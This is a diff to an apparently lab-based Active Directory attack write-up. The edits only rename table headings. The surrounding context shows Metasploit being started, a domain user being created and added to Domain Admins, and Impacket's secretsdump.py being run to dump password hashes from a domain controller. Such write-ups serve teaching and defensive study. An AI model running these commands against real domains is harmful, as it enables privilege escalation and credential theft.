@@ -141,9 +141,9 @@ First, I started the Metasploit Framework in quiet mode.
 msfconsole -q
 ```
 
-**Flag Breakdown:**
+**Breakdown:**
 
-| Flag | Description |
+| Part | Description |
 |----------------|-------------|
 | `msfconsole` | Starts the Metasploit Framework console |
 | `-q` | Starts Metasploit in quiet mode |
@@ -492,9 +492,9 @@ After opening a system shell in my lab session, I created a new domain user name
 ```bash
 net user test @shahin123#! /add /domain
 ```
-**Flag Breakdown**
+**Breakdown**
 
-| Command/Option | Description |
+| Part | Description |
 |----------------|-------------|
 | `net user` | Used to manage user accounts in Windows |
 | `test` | The username of the new account |
@@ -525,9 +525,9 @@ After creating the user in my lab, I tried to add that user to the `Domain Admin
 ```bash
 net group "Domain Admins" test /ADD /DOMAIN
 ```
-**Flag Breakdown**
+**Breakdown**
 
-| Command/Option | Description |
+| Part | Description |
 |----------------|-------------|
 | `net` | Windows built-in CLI tool for managing network and domain resources |
 | `group` | Specifies that the command is working with a domain-level group |
@@ -554,9 +554,9 @@ After creating the new domain user and adding it to the Domain Admins group in m
 ```bash
 secretsdump.py readteambd.local/test:'@shahin123#!'@192.168.5.134
 ```
-**Flag Breakdown**
+**Breakdown**
 
-| Command/Option | Description |
+| Part | Description |
 |----------------|-------------|
 | `secretsdump.py` | Impacket script used to dump password hashes and secrets from a Windows/Active Directory target |
 | `readteambd.local` | The target domain name |
